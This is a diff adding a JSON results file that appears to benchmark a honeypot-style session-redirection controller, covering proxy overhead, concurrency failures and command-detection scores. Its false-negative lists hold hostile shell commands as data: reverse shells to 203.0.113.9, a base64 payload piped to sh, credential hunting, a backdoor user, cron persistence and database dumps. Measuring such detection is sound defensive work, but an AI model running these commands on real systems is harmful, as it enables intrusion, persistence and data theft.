@@ -1,0 +1,346 @@
+{
+  "environment": {
+    "python": "3.13.16",
+    "platform": "linux",
+    "cpus": 2,
+    "build": "review1"
+  },
+  "A_proxy_overhead": {
+    "direct_victim": {
+      "n": 3000,
+      "mean": 0.036,
+      "p50": 0.033,
+      "p95": 0.052,
+      "p99": 0.098,
+      "max": 1.829
+    },
+    "via_controller": {
+      "n": 3000,
+      "mean": 0.09,
+      "p50": 0.084,
+      "p95": 0.122,
+      "p99": 0.195,
+      "max": 2.445
+    },
+    "overhead_mean_ms": 0.054,
+    "overhead_p95_ms": 0.07
+  },
+  "B_redirection": {
+    "sequential_sessions": 200,
+    "failed_sessions": 5,
+    "first_failure_at_session": 102,
+    "trigger_rtt_ms": {
+      "n": 101,
+      "mean": 22.927,
+      "p50": 19.485,
+      "p95": 39.373,
+      "p99": 145.375,
+      "max": 182.867
+    },
+    "redirect_overhead_ms": {
+      "n": 101,
+      "mean": 22.825,
+      "p50": 19.361,
+      "p95": 39.251,
+      "p99": 145.263,
+      "max": 182.83
+    },
+    "post_redirect_rtt_ms": {
+      "n": 202,
+      "mean": 4.366,
+      "p50": 3.558,
+      "p95": 8.772,
+      "p99": 10.623,
+      "max": 64.734
+    }
+  },
+  "C_concurrency": [
+    {
+      "concurrent_sessions": 10,
+      "completed": 10,
+      "failed": 0,
+      "success_rate_pct": 100.0,
+      "error_types": [],
+      "wall_clock_s": 1.04,
+      "sessions_per_s": 9.6,
+      "benign_rtt_ms": {
+        "n": 30,
+        "mean": 0.653,
+        "p50": 0.575,
+        "p95": 1.561,
+        "p99": 2.126,
+        "max": 2.126
+      },
+      "trigger_rtt_ms": {
+        "n": 10,
+        "mean": 19.693,
+        "p50": 20.579,
+        "p95": 30.842,
+        "p99": 30.842,
+        "max": 30.842
+      },
+      "post_redirect_rtt_ms": {
+        "n": 20,
+        "mean": 4.218,
+        "p50": 3.97,
+        "p95": 7.71,
+        "p99": 9.099,
+        "max": 9.099
+      },
+      "forensic_sessions_logged": 10,
+      "forensic_commands_logged": 30,
+      "forensic_completeness_pct": 100.0,
+      "forensic_report_corrupt": false,
+      "controller_after_load": {
+        "open_fds": 14,
+        "threads": 11,
+        "rss_mb": 12.7
+      }
+    },
+    {
+      "concurrent_sessions": 50,
+      "completed": 24,
+      "failed": 26,
+      "success_rate_pct": 48.0,
+      "error_types": [
+        "TimeoutError"
+      ],
+      "wall_clock_s": 4.04,
+      "sessions_per_s": 5.9,
+      "benign_rtt_ms": {
+        "n": 72,
+        "mean": 1.531,
+        "p50": 0.952,
+        "p95": 5.264,
+        "p99": 7.114,
+        "max": 7.348
+      },
+      "trigger_rtt_ms": {
+        "n": 24,
+        "mean": 70.186,
+        "p50": 62.194,
+        "p95": 117.062,
+        "p99": 124.267,
+        "max": 124.267
+      },
+      "post_redirect_rtt_ms": {
+        "n": 48,
+        "mean": 19.856,
+        "p50": 18.946,
+        "p95": 40.831,
+        "p99": 49.146,
+        "max": 49.146
+      },
+      "forensic_sessions_logged": 24,
+      "forensic_commands_logged": 72,
+      "forensic_completeness_pct": 100.0,
+      "forensic_report_corrupt": false,
+      "controller_after_load": {
+        "open_fds": 28,
+        "threads": 25,
+        "rss_mb": 13.5
+      }
+    },
+    {
+      "concurrent_sessions": 100,
+      "completed": 55,
+      "failed": 45,
+      "success_rate_pct": 55.0,
+      "error_types": [
+        "TimeoutError"
+      ],
+      "wall_clock_s": 5.07,
+      "sessions_per_s": 10.8,
+      "benign_rtt_ms": {
+        "n": 165,
+        "mean": 5.867,
+        "p50": 2.833,
+        "p95": 20.513,
+        "p99": 26.759,
+        "max": 77.014
+      },
+      "trigger_rtt_ms": {
+        "n": 55,
+        "mean": 142.637,
+        "p50": 128.413,
+        "p95": 243.142,
+        "p99": 280.695,
+        "max": 281.461
+      },
+      "post_redirect_rtt_ms": {
+        "n": 110,
+        "mean": 33.029,
+        "p50": 26.463,
+        "p95": 86.315,
+        "p99": 108.076,
+        "max": 112.202
+      },
+      "forensic_sessions_logged": 55,
+      "forensic_commands_logged": 165,
+      "forensic_completeness_pct": 100.0,
+      "forensic_report_corrupt": false,
+      "controller_after_load": {
+        "open_fds": 59,
+        "threads": 56,
+        "rss_mb": 14.6
+      }
+    },
+    {
+      "concurrent_sessions": 200,
+      "completed": 43,
+      "failed": 157,
+      "success_rate_pct": 21.5,
+      "error_types": [
+        "TimeoutError"
+      ],
+      "wall_clock_s": 5.07,
+      "sessions_per_s": 8.5,
+      "benign_rtt_ms": {
+        "n": 129,
+        "mean": 3.715,
+        "p50": 2.091,
+        "p95": 12.667,
+        "p99": 17.511,
+        "max": 32.21
+      },
+      "trigger_rtt_ms": {
+        "n": 43,
+        "mean": 98.017,
+        "p50": 96.95,
+        "p95": 156.492,
+        "p99": 172.866,
+        "max": 172.866
+      },
+      "post_redirect_rtt_ms": {
+        "n": 86,
+        "mean": 23.167,
+        "p50": 18.259,
+        "p95": 49.976,
+        "p99": 60.003,
+        "max": 81.005
+      },
+      "forensic_sessions_logged": 43,
+      "forensic_commands_logged": 129,
+      "forensic_completeness_pct": 100.0,
+      "forensic_report_corrupt": false,
+      "controller_after_load": {
+        "open_fds": 47,
+        "threads": 44,
+        "rss_mb": 14.1
+      }
+    },
+    {
+      "concurrent_sessions": 400,
+      "completed": 69,
+      "failed": 331,
+      "success_rate_pct": 17.2,
+      "error_types": [
+        "TimeoutError"
+      ],
+      "wall_clock_s": 5.11,
+      "sessions_per_s": 13.5,
+      "benign_rtt_ms": {
+        "n": 207,
+        "mean": 7.459,
+        "p50": 3.653,
+        "p95": 30.49,
+        "p99": 52.544,
+        "max": 82.51
+      },
+      "trigger_rtt_ms": {
+        "n": 69,
+        "mean": 195.292,
+        "p50": 206.912,
+        "p95": 289.908,
+        "p99": 321.937,
+        "max": 370.923
+      },
+      "post_redirect_rtt_ms": {
+        "n": 138,
+        "mean": 46.427,
+        "p50": 39.945,
+        "p95": 97.772,
+        "p99": 121.174,
+        "max": 138.155
+      },
+      "forensic_sessions_logged": 69,
+      "forensic_commands_logged": 207,
+      "forensic_completeness_pct": 100.0,
+      "forensic_report_corrupt": false,
+      "controller_after_load": {
+        "open_fds": 73,
+        "threads": 70,
+        "rss_mb": 15.2
+      }
+    }
+  ],
+  "D_detection": {
+    "malicious": 50,
+    "benign": 50,
+    "TP": 42,
+    "FP": 9,
+    "FN": 8,
+    "TN": 41,
+    "precision": 0.824,
+    "recall": 0.84,
+    "f1": 0.832,
+    "accuracy": 0.83,
+    "false_negatives": [
+      "base64 -d payload.b64 | sh",
+      "python3 -c 'import os;os.system(\"id\")'",
+      "nc -e /bin/sh 203.0.113.9 4444",
+      "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1",
+      "find / -perm -4000 2>/dev/null",
+      "tail -n 20 /var/log/auth.log",
+      "env | grep -i key",
+      "ls -la /root"
+    ],
+    "false_positives": [
+      "cat README.md",
+      "cat /var/log/syslog",
+      "cat notes.txt",
+      "sudo apt update",
+      "sudo systemctl restart nginx",
+      "curl localhost:8080/health",
+      "wget https://example.com/readme.txt",
+      "cat app.py",
+      "git config user.name"
+    ],
+    "long_benign_session_flagged_by_count_rule": true,
+    "inspect_time_us": 1.16
+  },
+  "D2_heldout_detection": {
+    "malicious": 25,
+    "benign": 25,
+    "TP": 11,
+    "FP": 6,
+    "FN": 14,
+    "TN": 19,
+    "precision": 0.647,
+    "recall": 0.44,
+    "false_negatives": [
+      "tar -czf /tmp/home.tgz /home/appadmin",
+      "echo '* * * * * /tmp/x.sh' | crontab -",
+      "useradd -m -s /bin/bash backdoor",
+      "docker exec -it db mysqldump app",
+      "history | grep ssh",
+      "pg_dump -U postgres prod > /tmp/p.sql",
+      "rm -rf /var/www",
+      "systemctl stop nginx",
+      "openssl enc -aes-256-cbc -in data.sql -out data.enc",
+      "python3 -c 'import pty;pty.spawn(\"/bin/sh\")'",
+      "find / -name '*.key' 2>/dev/null",
+      "gcloud auth print-access-token",
+      "sqlmap -u http://app/login",
+      "zip -r /tmp/all.zip /var/www"
+    ],
+    "false_positives": [
+      "sudo systemctl restart gunicorn",
+      "kubectl get pods",
+      "cat /etc/hostname",
+      "curl -I https://example.com",
+      "cat /etc/os-release",
+      "cat requirements.txt"
+    ]
+  }
+}
